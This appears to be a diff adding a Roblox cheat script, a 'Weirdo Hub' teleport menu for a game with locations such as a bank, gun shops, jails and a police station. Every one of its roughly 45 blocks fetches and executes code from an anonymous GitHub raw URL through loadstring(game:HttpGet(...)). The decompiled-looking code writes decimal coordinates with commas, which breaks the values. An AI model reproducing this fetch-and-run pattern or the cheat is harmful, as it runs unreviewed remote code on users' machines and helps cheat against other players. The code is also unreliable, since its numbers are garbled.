+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Admin Guns #1", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -872,63488769531
+  d = -32,649208068848
+  e = -532,40045166016
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Admin Guns #2", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -810,33892822266
+  d = -39,649211883545
+  e = -933,86071777344
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Admin Hangout", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -1009,374
+  d = -53,154
+  e = -1014,02
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Admin Jail", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -799,534
+  d = -40,649
+  e = -839,368
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Bank", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -485,668
+  d = 23,631
+  e = -285,169
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Bank Roof", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -468,723
+  d = 38,031
+  e = -286,021
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Basketball Court", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -932,195
+  d = 21,1
+  e = -481,737
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Boxing", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -236,006
+  d = 23,151
+  e = -1120,531
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Casino", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -905
+  d = 19,25
+  e = -142,75
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Cemetery", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 190,56588745117
+  d = 21,749992370605
+  e = 27,322988510132
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Church", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 205,77447509766
+  d = 23,7799949646
+  e = -59,920375823975
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Club", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -262,34463500977
+  d = 23,522811889648
+  e = -499,6611328125
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("DH Fitness", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -75,794998168945
+  d = 22,700284957886
+  e = -633,71997070313
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("DH Kicks", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -205,59103393555
+  d = 21,845796585083
+  e = -409,92074584961
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("DH Klips", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 7,0170149803162
+  d = 21,749996185303
+  e = -105,73072814941
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Fire Station", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -129,52
+  d = 26,812
+  e = -114,456
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Flower Shop", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -71,061767578125
+  d = 23,144777297974
+  e = -323,15124511719
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Food Shack #1", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -342,74331665039
+  d = 23,680646896362
+  e = -297,6901550293
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Food Shack #2", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 298,42929077148
+  d = 49,280658721924
+  e = -610,31072998047
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Furniture #1", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -490,37777709961
+  d = 21,849847793579
+  e = -108,88053131104
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Furniture #2", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -624,314453125
+  d = 23,245740890503
+  e = -260,44833374023
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Gas Station", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 595,377
+  d = 49
+  e = -264,222
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Green Screen Area", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -506,33642578125
+  d = 48,602363586426
+  e = -213,86831665039
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Gun Shop #1", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -582
+  d = 8,3147783279419
+  e = -739,01501464844
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Gun Shop #2", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 481,6549987793
+  d = 48,070491790771
+  e = -622,24700927734
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("High School", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -531,16064453125
+  d = 21,874992370605
+  e = 269,4602355957
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Hospital", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 98,829124450684
+  d = 22,799991607666
+  e = -485,57116699219
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Jail Area #1", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -294,16198730469
+  d = 21,799936294556
+  e = -111,71600341797
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Jail Area #2", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -294,09582519531
+  d = 21,797946929932
+  e = -69,033515930176
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Jail Area #3", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -331,52569580078
+  d = 21,74800491333
+  e = -91,514602661133
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Mobile Home", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -951,15283203125
+  d = -1,2344611883163
+  e = 467,71234130859
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Movies", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -1005,7873535156
+  d = 25,100023269653
+  e = -133,55313110352
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Phone Store", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -120,12100219727
+  d = 21,901559829712
+  e = -870,42498779297
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Playground", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -247,33399963379
+  d = 22,149866104126
+  e = -756,50299072266
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Police Station", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -267,78082275391
+  d = 21,799951553345
+  e = -113,97263336182
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Sewers", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 112,62200164795
+  d = -26,750036239624
+  e = -277,3210144043
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Sewer Station", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -423,14276123047
+  d = -21,000005722046
+  e = 65,835586547852
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Skate Park", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -791,34893798828
+  d = 21,99981880188
+  e = -501,31112670898
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Taco Shop", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 551,8681640625
+  d = 51,06139755249
+  e = -494,22760009766
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Train Station", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 612,94427490234
+  d = 47,999992370605
+  e = -106,67445373535
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("UFO Spot", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 71,565002441406
+  d = 138,99995422363
+  e = -690,33001708984
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddLabel("Extra Waypoints")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Highschool Hiding Spot", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -495,40979003906
+  d = 22,48122215271
+  e = 378,34582519531
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Building Near Bank #1 N", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -322,31817626953
+  d = 80,214508056641
+  e = -271,78900146484
+  b = b(c, d, e)
+  a.CFrame = b
+end)
